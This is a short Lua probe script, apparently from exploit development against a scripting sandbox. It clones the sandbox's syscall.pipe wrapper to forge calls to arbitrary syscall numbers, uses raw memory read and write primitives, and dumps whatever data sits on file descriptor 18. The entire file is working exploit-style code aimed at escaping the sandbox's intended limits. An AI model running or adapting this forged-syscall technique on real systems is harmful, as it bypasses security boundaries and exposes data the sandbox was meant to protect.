-- CRASH_CLASS: LOW
-- PROBE 977b: what is on fd 18
print("=== PROBE 977b: FD 18 CONTENT ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function rb(a) local o,v=pcall(function() return to_num(memory.read_byte(a)) end) if o then return v end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local pid=to_num(mk(20)())
print(string.format("[A] pid=%u", pid))
local buf=memory.alloc(0x1000)
for round=0,3 do
    for i=0,0xFFC,4 do wd(buf+i,0) end
    local ok, rv = pcall(function() return mk(3)(uint64(18),uint64(buf),uint64(0x1000)) end)
    if not ok then print("  PCALL-FAIL"); break end
    local h,l = hi_lo(rv)
    print(string.format("  [R%d] read=%d", round, l))
    if l <= 0 then break end
    local s=""
    for i=0,math.min(l,512)-1 do
        local c=rb(buf+i)
        if c>=32 and c<127 then s=s..string.char(c) elseif c==10 then s=s.."\\n" elseif c==13 then s=s.."\\r" else s=s..string.format("\\x%02x",c) end
    end
    print("    " .. s)
end
print("[Z] alive=" .. tostring(to_num(mk(20)())))
print("=== COMPLETE ===")
